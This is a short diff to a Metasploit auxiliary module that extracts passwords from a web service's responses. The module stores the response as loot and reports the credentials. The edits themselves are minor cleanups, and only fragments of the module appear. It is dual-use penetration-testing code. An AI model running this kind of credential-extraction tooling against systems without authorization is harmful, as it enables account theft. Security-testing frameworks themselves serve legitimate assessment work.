@@ -56,7 +56,6 @@ class Metasploit3 < Msf::Auxiliary
 
 			if res.body =~ /<password>(.*)<\/password>/
 				print_good("#{rhost}:#{rport} - credentials successfully extracted")
-				#vprint_status("#{res.body}")
 
 				#store all details as loot -> there is some usefull stuff in the response
 				loot = store_loot("account_details.txt","text/plain",rhost, res.body)
@@ -78,13 +77,11 @@ class Metasploit3 < Msf::Auxiliary
 						:sname => 'http',
 						:user => @user,
 						:pass => pass,
-						:source_type => "user_supplied",
 						:active => true
 						)
 					end
 				end
 			end
-
 		rescue ::Rex::ConnectionError
 			vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
 			return
